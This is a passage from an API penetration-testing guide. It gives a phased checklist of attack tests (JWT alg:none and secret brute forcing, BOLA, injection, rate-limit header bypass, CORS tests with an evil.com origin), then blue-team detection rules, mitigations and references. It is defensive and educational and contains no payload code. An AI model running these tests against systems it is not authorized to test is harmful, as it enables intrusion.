- [ ] ffuf version enumeration completed
- [ ] Complete endpoint list built

### Phase 2: Documentation
- [ ] All endpoints listed with methods
- [ ] Auth requirements noted per endpoint
- [ ] All parameters documented
- [ ] Response schemas analyzed
- [ ] Deprecated fields identified

### Phase 3: Authentication
- [ ] JWT decoded and analyzed
- [ ] JWT alg:none tested
- [ ] JWT algorithm confusion tested (if RS256)
- [ ] JWT secret brute forced
- [ ] API key locations tested (header/query/body)
- [ ] OAuth redirect_uri tested for open redirect
- [ ] OAuth state parameter validated
- [ ] Token invalidation after logout tested
- [ ] Token expiry tested

### Phase 4: Authorization
- [ ] Two test accounts created
- [ ] All object IDs collected from Account A
- [ ] Account B tested against all A's objects (BOLA)
- [ ] Unauthenticated access tested for all endpoints
- [ ] Admin endpoints tested with regular user token
- [ ] HTTP methods tested for all endpoints
- [ ] Old API versions tested

### Phase 5: Business Logic
- [ ] Negative values tested
- [ ] Zero/null values tested
- [ ] Race conditions tested for critical ops
- [ ] Workflow bypass attempted
- [ ] Promo/coupon reuse tested
- [ ] OTP brute force tested
- [ ] Mass account creation tested

### Phase 6: Injection
- [ ] SQLi tested in all parameters
- [ ] NoSQLi tested (if MongoDB/document DB)
- [ ] Command injection tested
- [ ] SSTI tested in template parameters
- [ ] XXE tested (SOAP/XML endpoints)
- [ ] SSRF tested in URL parameters

### Phase 7: Rate Limiting
- [ ] Rate limit threshold measured
- [ ] X-Forwarded-For bypass tested
- [ ] All forwarding header bypasses tested
- [ ] Resource exhaustion tested
- [ ] SMS/email cost amplification tested

### Phase 8: Misconfiguration
- [ ] CORS tested with evil.com origin
- [ ] Debug endpoints scanned
- [ ] Security headers checked
- [ ] TLS configuration tested (testssl.sh)
- [ ] TRACE method tested
- [ ] Error verbosity tested
- [ ] HTTP (non-TLS) tested

---

## 🔍 Detection

From a Blue Team perspective, detect API pentesting by:

| Attacker Phase | Detection Signal | Alert Rule |
|---|---|---|
| Recon | Requests to /swagger, /openapi.json, /api-docs | Alert on API spec path access from non-internal IPs |
| Version enum | Sequential `/api/v1/`, `/api/v2/` requests | Multiple version paths from same IP |
| BOLA testing | Sequential integer IDs in URLs | ID enumeration detection (IDs ±N from user's own) |
| Auth testing | Multiple JWT structures in requests | JWT alg:none in header |
| Brute force | Many 401s from same IP | >5 failed auth per minute |
| Injection | SQL/NoSQL operators in parameters | WAF pattern matching |
| Rate limit bypass | Rotating X-Forwarded-For values | Suspicious header pattern changes |

---

## 🛡️ Mitigation Summary

| Layer | Control |
|---|---|
| Authentication | RS256 JWTs; short expiry; blacklist on logout; MFA |
| Authorization | Default deny; RBAC; ownership check every request |
| Input validation | Allowlist fields; schema validation; type checking |
| Rate limiting | Per-user AND per-IP; per-operation limits |
| CORS | Explicit origin allowlist; no wildcard + credentials |
| Error handling | Generic messages to client; full detail in logs |
| Inventory | API gateway for all routes; version sunsetting policy |
| Secrets | No secrets in code/URLs; rotate API keys; vault |
| TLS | TLS 1.2+ only; HSTS; valid cert |
| Monitoring | Log all API calls with user context; SIEM alerts |

---

## 📚 References

- [OWASP API Security Testing Guide](https://owasp.org/API-Security/)
- [APIsec University — Free API Security Course](https://university.apisec.ai/)
- [PortSwigger Web Security Academy — API Testing](https://portswigger.net/web-security/api-testing)
- [HackTricks — API Pentesting](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/api-pentesting)
- [jwt_tool Wiki](https://github.com/ticarpi/jwt_tool/wiki)
- [Kiterunner — Assetnote](https://github.com/assetnote/kiterunner)
- [Arjun — HTTP Parameter Discovery](https://github.com/s0md3v/Arjun)
- [Autorize — Burp Extension for BOLA](https://github.com/Quitten/Autorize)
- [Testing OAuth 2.0 — PortSwigger](https://portswigger.net/web-security/oauth)
- [NoSQL Injection — OWASP](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection)
- [Bug Bounty API Writeups Collection](https://pentester.land/list-of-bug-bounty-writeups.html)
- [API Security Weekly](https://apisecurity.io/)
